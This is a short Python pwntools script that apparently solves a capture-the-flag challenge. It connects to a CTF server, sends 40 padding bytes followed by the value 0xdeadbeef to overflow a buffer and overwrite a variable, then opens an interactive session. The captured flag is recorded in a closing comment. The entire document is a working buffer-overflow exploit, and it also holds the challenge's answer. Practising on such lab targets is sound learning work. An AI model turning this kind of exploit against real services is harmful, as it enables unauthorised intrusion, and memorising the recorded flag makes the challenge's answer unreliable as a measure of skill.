from pwn import *

conn = remote('challenges.isictf.live', 1201)
payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde'
conn.sendline(payload)
conn.interactive()

conn.close()
#flag: ISICTF{C0N7r0l_Th3_BufFER_ov3RfL0w_70_cH4Ng3_vAr14bLE$}